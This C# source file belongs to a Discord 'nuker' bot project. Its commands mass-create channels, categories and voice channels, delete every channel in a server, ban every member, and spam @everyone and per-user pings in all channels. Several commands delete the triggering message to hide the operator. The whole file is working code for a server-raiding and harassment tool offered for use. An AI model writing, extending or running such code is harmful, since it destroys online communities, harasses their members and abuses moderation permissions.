using Discord;
using Discord.Commands;
using System;
using System.IO;
using System.Threading.Tasks;

namespace DiscordNuker.NET.Commands
{
    public class MassChannels : ModuleBase
    {
        [Command("mass chan", RunMode = RunMode.Async)]

        public async Task CreateChannels()
        {
            var dm = Context.Message.Author;
            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of channels to make?");

            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);

            Console.WriteLine("[-] Name of channels? (seperate with -)");
            string channame = Console.ReadLine();
            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateTextChannelAsync(channame);
                Console.WriteLine("Created " + channame + " | " + i);
            }
        }

        [Command("mass del", RunMode = RunMode.Async)]

        public async Task DelChannels()
        {
            var okay = new Emoji("👍");
            await Context.Message.AddReactionAsync(okay);

            foreach (var chan in await Context.Guild.GetChannelsAsync())
            {
                try
                {
                    await chan.DeleteAsync();
                    Console.WriteLine("Deleted " + chan);

                }
                catch
                {
                    Console.WriteLine("[x] Couldn't delete" + chan);
                }
            }
        }

        [Command("mass cate", RunMode = RunMode.Async)]

        public async Task CreateCategories()
        {
            var dm = Context.Message.Author;
            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of categories to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels?");
            string catename = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateCategoryAsync(catename);
                Console.WriteLine("Created " + catename + " | " + i);
            }
        }

        [Command("mass vc", RunMode = RunMode.Async)]

        public async Task CreateVC()
        {

            var dm = Context.Message.Author;
            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of voice channels to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels?");
            string vcname = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateVoiceChannelAsync(vcname);
                Console.WriteLine("Created " + vcname + " | " + i);
            }
        }

        [Command("mass ban", RunMode = RunMode.Async)]

        public async Task BanAll()
        {
            var okay = new Emoji("👍");
            await Context.Message.AddReactionAsync(okay);
            await Context.Guild.DownloadUsersAsync();
            foreach (var user in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await Context.Guild.AddBanAsync(user);
                    Console.WriteLine("Banned: " + user);
                    File.AppendAllText("NukerLogs.txt", DateTime.Now + " Banned: " + user + Environment.NewLine);
                }
                catch
                {
                    Console.WriteLine("Couldn't ban " + user);
                }

            }
        }

        [Command("mass ping", RunMode = RunMode.Async)]

        public async Task PingAll()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Message to say after the ping?");
            var msg = Console.ReadLine();

            foreach (var mem in await Context.Guild.GetUsersAsync())
            {
                await ReplyAsync(mem.Mention + msg);
            }
        }

        [Command("mass mention", RunMode = RunMode.Async)]

        public async Task MentionAll()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Message to send after @everyone?");
            var msg = Console.ReadLine();
            Console.WriteLine("[-] How many messages to send in each channel?");
            var repeat = Console.ReadLine();
            int num = Convert.ToInt32(repeat);
            for (int i = 0; i < num; i++)
            {
                foreach (var channel in await Context.Guild.GetTextChannelsAsync())
                {
                    try
                    {
                        await channel.SendMessageAsync("@everyone" + msg);
                        Console.WriteLine("Sent " + msg + " in " + channel + " , sending: " + num + " messages in every channel.");
                    }
                    catch
                    {
                        Console.WriteLine("Couldn't send " + msg + " in " + channel);
                    }

                }
            }
        }

    }
}
